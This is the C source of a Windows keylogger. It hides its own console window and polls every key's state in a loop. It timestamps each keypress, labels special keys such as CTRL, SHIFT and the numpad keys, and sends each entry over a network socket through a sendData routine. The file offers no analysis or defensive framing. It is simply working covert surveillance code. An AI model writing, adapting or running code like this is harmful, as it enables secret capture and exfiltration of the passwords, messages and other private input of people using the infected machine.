#include "KeyLogger.h"


int main(){

	LPCSTR filename = "logs.txt";
	// FILE* fp;

	int flagSpecialKey = 0;
	bool flagBoolSpecialKey = false;

	FreeConsole();
	int isResult = isResult = initSocket();

	printf("Scoket initiated...\n");

	while (true) {

		Sleep(10);
		//fp = fopen(filename, "a+");
		for (short i = 0; i < 256; i++) {

			if (GetAsyncKeyState(i) == -32767) {

				time_t now = time(0);
				char* dt = ctime(&now);
				char subbuff[25] = "";
				memcpy(subbuff, &dt[0], 24);
				subbuff[24] = '\0';

				switch (i){

				case VK_RETURN:
					strcat(subbuff, " : RETURN\n");
					flagSpecialKey++;
					break;
				case VK_TAB:
					strcat(subbuff, " : TAB\n");
					flagSpecialKey++;
					break;
				case VK_BACK:
					strcat(subbuff, " : BKS\n");
					flagSpecialKey++;
					break;
				case VK_CAPITAL:
					strcat(subbuff, " : CAPS\n");
					flagSpecialKey++;
					break;
				case VK_UP:
					strcat(subbuff, " : UP\n");
					flagSpecialKey++;
					break;
				case VK_DOWN:
					strcat(subbuff, " : DOWN\n");
					flagSpecialKey++;
					break;
				case VK_LEFT:
					strcat(subbuff, " : LEFT\n");
					flagSpecialKey++;
					break;
				case VK_RIGHT:
					strcat(subbuff, " : RIGHT\n");
					flagSpecialKey++;
					break;
				case VK_CONTROL:
					strcat(subbuff, " : CTRL\n");
					flagSpecialKey++;
					flagBoolSpecialKey = true;
					break;
				case VK_SHIFT:
					strcat(subbuff, " : SHIFT\n");
					flagBoolSpecialKey = true;
					flagSpecialKey++;
					break;
				case VK_MENU:
					strcat(subbuff, " : ALT\n");
					flagBoolSpecialKey = true;
					flagSpecialKey++;
					break;
				case VK_NUMPAD0:
					strcat(subbuff, " : 0\n");
					flagSpecialKey++;
					break;
				case VK_NUMPAD1:
					strcat(subbuff, " : 1\n");
					flagSpecialKey++;
					break;
				case VK_NUMPAD2:
					strcat(subbuff, " : 2\n");
					flagSpecialKey++;
					break;
				case VK_NUMPAD3:
					strcat(subbuff, " : 3\n");
					flagSpecialKey++;
					break;
				case VK_NUMPAD4:
					strcat(subbuff, " : 4\n");
					flagSpecialKey++;
					break;
				case VK_NUMPAD5:
					strcat(subbuff, " : 5\n");
					flagSpecialKey++;
					break;
				case VK_NUMPAD6:
					strcat(subbuff, " : 6\n");
					flagSpecialKey++;
					break;
				case VK_NUMPAD7:
					strcat(subbuff, " : 7\n");
					flagSpecialKey++;
					break;
				case VK_NUMPAD8:
					strcat(subbuff, " : 8\n");
					flagSpecialKey++;
					break;
				case VK_NUMPAD9:
					strcat(subbuff, " : 9\n");
					flagSpecialKey++;
					break;
				case VK_NUMLOCK:
					strcat(subbuff, " : NUMLOCK\n");
					flagSpecialKey++;
					break;
				case VK_SPACE:
					strcat(subbuff, " : SPACE\n");
					flagSpecialKey++;
					break;
				case MK_LBUTTON:
					strcat(subbuff, " : LMB\n");
					flagSpecialKey++;
					break;
				case MK_RBUTTON:
					strcat(subbuff, " : RMB\n");
					flagSpecialKey++;
					break;
				default:
					if (flagSpecialKey == 0) 
						sprintf(subbuff, "%s%s%c\n", subbuff, " : ", i);
					
					if(flagBoolSpecialKey){

						flagSpecialKey++;
						flagBoolSpecialKey = false;
						//printf("%d\n", flagSpecialKey);
					}
					
					break;
				}
				
				if (flagSpecialKey != 2) {
					sendData(subbuff);
					printf("%s", subbuff);
				}

				if (!flagBoolSpecialKey)
					flagSpecialKey = 0;
			}
		}
		//fclose(fp);
		
	}
	
	closeSocket();
}